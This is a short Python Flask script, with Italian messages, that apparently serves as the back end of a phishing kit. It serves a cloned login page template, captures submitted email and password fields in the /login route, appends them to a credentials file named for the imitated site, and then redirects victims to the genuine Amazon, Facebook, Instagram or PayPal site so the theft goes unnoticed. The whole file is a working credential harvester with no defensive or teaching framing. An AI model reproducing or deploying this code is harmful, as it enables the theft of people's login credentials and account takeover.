import os
from flask import Flask, render_template, request, redirect
import logging

app = Flask(__name__)

logging.getLogger('werkzeug').setLevel(logging.ERROR)
app.logger.setLevel(logging.ERROR)

TEMPLATE_NAME = os.environ.get('TEMPLATE_NAME')

if not TEMPLATE_NAME:
    templates_dir = os.path.join(os.path.dirname(__file__), 'templates')
    try:
        files = sorted([f for f in os.listdir(templates_dir) if f.lower().endswith('.html')])
    except Exception:
        files = []
    if files:
        TEMPLATE_NAME = files[0]
    else:
        raise SystemExit('Nessun template trovato e TEMPLATE_NAME non impostato')

site_base = os.path.splitext(os.path.basename(TEMPLATE_NAME))[0]

CREDENTIALS_FILE = os.environ.get('CREDENTIALS_FILE', os.path.join('credenziali', f'Credenziali_{site_base}.txt'))

app.logger.info('Selected TEMPLATE_NAME: %s', TEMPLATE_NAME)

default_redirects = {
    'amazon': 'https://www.amazon.com',
    'facebook': 'https://www.facebook.com',
    'insta': 'https://www.instagram.com',
    'instagram': 'https://www.instagram.com',
    'paypal': 'https://www.paypal.com'
}
REDIRECT_URL = os.environ.get('REDIRECT_URL', default_redirects.get(site_base.lower(), 'https://www.google.com'))

@app.route('/')
def index():
    return render_template(TEMPLATE_NAME)

@app.route('/__selected')
def selected():
    return {'template': TEMPLATE_NAME}

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        email = (
            request.form.get('email')
            or request.form.get('username')
            or request.form.get('login_email')
            or request.form.get('emailAddress')
            or request.form.get('user')
        )
        password = (
            request.form.get('pass')
            or request.form.get('password')
            or request.form.get('login_password')
            or request.form.get('pwd')
        )

        creds_dir = os.path.dirname(CREDENTIALS_FILE) or '.'
        if creds_dir and not os.path.exists(creds_dir):
            try:
                os.makedirs(creds_dir, exist_ok=True)
            except Exception:
                pass

        if (email is not None and email != '') or (password is not None and password != ''):
            try:
                with open(CREDENTIALS_FILE, 'a') as f:
                    f.write(f'Email/Telefono: {email}, Password: {password}\n')
                    f.flush()
            except Exception:
                app.logger.exception('Impossibile scrivere le credenziali su %s', CREDENTIALS_FILE)

    return redirect(REDIRECT_URL)

if __name__ == '__main__':
    app.run(debug=False, port=5001)
